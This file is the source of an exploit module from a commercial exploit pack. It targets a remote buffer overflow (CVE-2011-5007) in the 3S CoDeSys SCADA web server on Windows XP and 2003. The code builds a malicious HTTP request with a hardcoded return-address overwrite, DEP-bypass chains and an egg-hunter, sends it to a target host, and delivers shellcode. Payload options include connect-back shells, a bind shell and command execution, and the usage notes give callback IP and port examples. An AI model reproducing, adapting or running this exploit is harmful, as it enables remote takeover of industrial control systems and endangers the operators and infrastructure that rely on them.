#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


NAME = "3S CoDeSys SCADA CmpWebServer Remote Overflow"
DESCRIPTION = "Exploits a remote overflow in the 3S CoDeSys CmpWebServer"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='3S Smart Software Solutions GmbH'
DOCUMENTATION["Date public"] = "2011-11-29"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2011-5007"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5007'
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["References"] = "http://www.osvdb.org/77387"
DOCUMENTATION["Notes"] = """
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP" ]

NOTES="""
-------------------------------------------
WP> White Phosphorus Exploit Pack
WP> 3S CoDeSys CmpWebServer Remote Overflow
-------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 SP1-SP2 (DEP)
2: Windows XP SP2-SP3 (DEP)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_3s_codesys_cmpwebserver/wp_3s_codesys_cmpwebserver.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 8080

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets,PORT)
    return

targets = {
    0 : ["Autoversioning", (0x0000), []],
    1 : ["Windows 2003 SP1-SP2 (DEP)", (0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3 (DEP)", (0x0000), [WINXPSP2, WINXPSP3]]
}

class theexploit(wp_exploit):
    PAYLOADS = ["TCP Connect Back",
                "IE Inject Connect Back",
                "HTTPMOSDEF SSL",
                "HTTPMOSDEF PLAIN",
                "Bind MOSDEF Shell",
                "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20\x25"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.encode_printable = True
        self.revertToSelf = False
        return

    def usage(self):
        self.wp_usage(targets)
        return

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def neededListenerTypes(self):
        self.getArgs()    
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targetting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()   

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        sc = 'c00kc00k'
        if self.version == 1:
            sc += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8).replace(pack('<L', 0x77BB2563), pack('<L', 0x77BC5D88))
        elif self.version == 2:
            sc += self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8)
        sc += self.shellcode
        sc += wp_randomstring(100)
        
        payload = 'GET /'
        payload += wp_randomstring(1)
        payload += pack('<L', 0x100103D9) # EIP
        if self.version == 1:
            payload += self.wp_UniversalDEPBypassWin2k3_VP(128).replace(pack('<L', 0x77BB2563), pack('<L', 0x77BC5D88))
            payload += wp_SearchCode(True)
        elif self.version == 2:
            payload += self.wp_UniversalDEPBypassWinXP_VP(128)
            payload += wp_SearchCode(True)
        payload += wp_randomstring(534-len(payload))
        if self.version == 1: # 2003
            payload += pack('<L', 0x02E7FB50) # Readable ptr of our eip as above
            payload += pack('<L', 0x02E7FA18) # Writeable ptr of eip to overwrite
        elif self.version == 2: # XP
            payload += pack('<L', 0x029DFB4C)#2 # R ptr eip
            payload += pack('<L', 0x029DFA14) # W ptr eip to overwrite
        payload += wp_randomstring(600)
        payload += '\\%s HTTP/1.1\r\n'%wp_randomstring(1)
        payload += 'Host: %s\r\n'%self.host
        payload += 'User-Agent: %s\r\n\r\n'%sc
        payload += '\r\n\r\n'
        return payload

    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        payload = self.makesploit()
        self.result_error = 0
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(2)
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        time.sleep(3)

        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
